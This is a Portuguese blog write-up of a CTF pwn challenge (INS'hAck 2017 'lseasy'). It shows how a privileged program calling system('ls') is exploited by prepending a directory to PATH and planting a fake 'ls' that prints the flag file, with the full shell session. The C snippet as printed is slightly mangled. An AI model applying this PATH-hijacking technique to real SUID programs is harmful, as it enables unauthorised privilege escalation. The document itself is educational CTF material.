---
layout: default
title: PWN1 - Explorando system() call [INS'hAck 2017] Write-up
date: 2017-04-18 19:47
author: brennords
comments: true
categories: [CTFs]
---
O <a href="https://ctftime.org/event/444">Ins'hAck</a> foi um ctf online que ocorreu do dia 6 de abril ao dia 9. Teve uns desafios bem interessantes e foi bem organizado pelo time <a href="https://ctftime.org/team/11869">InSecurity</a>.

Este write-up é referente ao primeiro nível de pwn e foi simples caso você já soubesse o caminho. Mas, sendo o noob que sou, demorei um pouco para sacar onde estava a falha e quando resolvi o chall fiquei feliz em ter aprendido algo novo.

A descrição era a seguinte:

<blockquote>My shower won't give me warm water :/ maybe it's an hacker? :o Could you help me? ssh you_ssh_user@pwn1.ctf.insecurity-insa.fr

Note: Please see your profile to know you SSH creds.</blockquote>

Que em português seria:

<blockquote>Meu chuveiro não quer me dar água quente :/ talvez seja um hacker? :0 Você pode ajudar?</blockquote>

E logo abaixo as instruções para conectar ao ssh do ctf que ficou offline desde o fim da competição.

Mas não se desespere. Ainda é possível tentar resolver pegando <a href="https://github.com/HugoDelval/inshack-2017/raw/master/challenges/pwn/lseasy-75/public-files/lseasy.zip">neste link</a> uma cópia do desafio.

Dentro do arquivo zipado há um elf executável chamado <strong><em>lseasy</em></strong> acompanhado do seu código fonte <em><strong>vuln.c</strong></em>. Estes dois arquivos podiam ser encontrados dentro do servidor junto com o arquivo flag.txt. Obviamente este arquivo não tinha permissões de leitura para meu usuário atual, mas podia ser lido pelo usuário que <strong><em>lseasy</em></strong> rodava. É o tipo de coisa padrão nesses desafios xpl/pwn. O objetivo é explorar o desafio e seus privilégios para, de alguma forma, ler o arquivo da flag.

Ao se executar o binário pela primeira vez, se percebe que ele apenas lista os arquivos do diretório atual. Uma olhada no código fonte<strong><em> </em></strong>confirma que essa é sua única função:

https://gist.github.com/anonymous/537b9729bb928e98d5af400aae650168

Não há muito o que explicar. Perdi tempo tentando variadas maneiras ler a flag. Logo estava lendo a <a href="http://man7.org/linux/man-pages/man3/system.3.html">manpage da função system</a>. Parecia ser a única coisa restante a ser explorada. Na seção de notas encontrei um aviso que dizia para não usa-la em programas SUID porque valores das variáveis de ambiente podiam ser usados para subverter o sistema. Ok, é exatamente o objetivo. Mas a nota não dizia como fazer isso.

Pesquisei por "exploit system call" no google e encontrei um<a href="https://www.go4expert.com/articles/exploit-c-t24920/"> tutorial mastigado</a> de como explorar um programa de exemplo exatamente igual ao do chall.

O segredo é que system vai procurar pelo binário nos caminhos contidos na <a href="https://www.vivaolinux.com.br/artigo/O-que-e-PATH-como-funciona-e-como-trabalhar-com-ele">variável de sistema <strong>PATH</strong></a>. E, como nada impede a alteração desta variável, é possível adicionar um caminho arbitrário.

```

brenno@budweiser:~/Docs/ctf/inshack2017/pwn1$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
brenno@budweiser:~/Docs/ctf/inshack2017/pwn1$ PATH=$HOME/Docs/ctf/inshack2017/pwn1:$PATH
brenno@budweiser:~/Docs/ctf/inshack2017/pwn1$ echo $PATH
/home/brenno/Docs/ctf/inshack2017/pwn1:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

```

O primeiro comando printa minha variável PATH atual, no segundo eu adiciono o caminho "$HOME/Docs/ctf/inshack2017/pwn1" no ínicio da varíavel de sistema e o terceiro printa o conteúdo alterado.

Agora, sempre que system for procurar o binário de ls, vai olhar primeiro dentro de "$HOME/Docs/ctf/inshack2017/pwn1". E é onde criei um ls mais coerente com meu objetivo.

```

brenno@budweiser:~/Docs/ctf/inshack2017/pwn1$ cat ls.c
#include stdio.h

int main() {
system(cat flag.txt);
return 0;
}
^C
brenno@budweiser:~/Docs/ctf/inshack2017/pwn1$ gcc ls.c -o ls
brenno@budweiser:~/Docs/ctf/inshack2017/pwn1$ ./lseasy
The content of the current folder is :
INSA{SySt3m_1s_3v1l_-}
brenno@budweiser:~/Docs/ctf/inshack2017/pwn1$

```

Na primeira parte criei um simples programa em C usando a mesma função system para executar o comando <strong>cat flag.txt</strong>. Então o compilei dando o nome de ls e, ao executar o binário lseasy pode-se ver que ao invés de imprimir o conteúdo da pasta, ele imprime o conteúdo de flag.txt.


